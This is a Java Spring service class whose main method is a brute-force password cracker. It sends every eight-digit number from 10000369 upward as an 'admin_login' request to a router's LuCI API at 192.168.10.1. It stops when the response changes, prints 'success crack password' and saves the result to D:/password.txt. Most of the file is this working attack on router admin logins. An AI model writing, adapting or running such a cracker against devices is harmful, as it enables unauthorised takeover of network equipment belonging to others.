package com.hquery.blog;

import org.springframework.boot.web.client.RestTemplateBuilder;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import java.io.*;

@Service
public class PostDataService {

	RestTemplate restTemplate;

	HttpHeaders headers = new HttpHeaders();

	public void init() {
		RestTemplateBuilder builder = new RestTemplateBuilder();
		builder.setConnectTimeout(30000);
		builder.setReadTimeout(30000);
		restTemplate = builder.build();
		MediaType type = MediaType.parseMediaType("application/x-www-form-urlencoded; charset=UTF-8");
		headers.setContentType(type);
		headers.setConnection("keep-alive");

	}

	public void contextLoads() throws Exception {

//		File fileMap = new File("D:/numberMap.txt");
//		InputStreamReader isr = new InputStreamReader(new FileInputStream(fileMap));
//		BufferedReader br = new BufferedReader(isr);
//		String lineTxt = null;
//		while ((lineTxt = br.readLine()) != null) {
//			executorService.submit(new PostData(restTemplate, headers, lineTxt));
//		}
		for (Long i = 10000369L; i < 99999999L; i++) {
			String body = new StringBuilder("{\"method\":\"admin_login\",\"params\":[\"").append(i).append("\"]}").toString();
			HttpEntity<Object> request = new HttpEntity<>(body, headers);
			String response = restTemplate.postForEntity("http://192.168.10.1/cgi-bin/luci/api/auth/", request, String.class).getBody();
			System.out.println(body);
			if (!"]".equals(response.substring(21, 22))) {
				System.out.println("success crack password : " + response);
				File file = new File("D:/password.txt");
				try {
					FileOutputStream fileOutputStream = new FileOutputStream(file);
					OutputStreamWriter outputStreamWriter = new OutputStreamWriter(fileOutputStream);
					BufferedWriter bufferedWriter = new BufferedWriter(outputStreamWriter);
					bufferedWriter.write(response);
					bufferedWriter.flush();
				} catch (Exception e) {
					e.printStackTrace();
				}
				break;
			}
		}

	}

	public ResponseEntity<String> post(String uri, String body, String contentType) {
		HttpHeaders headers = new HttpHeaders();
		MediaType type = MediaType.parseMediaType(contentType);
		headers.setContentType(type);
		headers.setConnection("keep-alive");
		HttpEntity<Object> request = new HttpEntity<>(body, headers);
		ResponseEntity<String> entity = restTemplate.postForEntity(uri, request, String.class);
		return entity;
	}

}
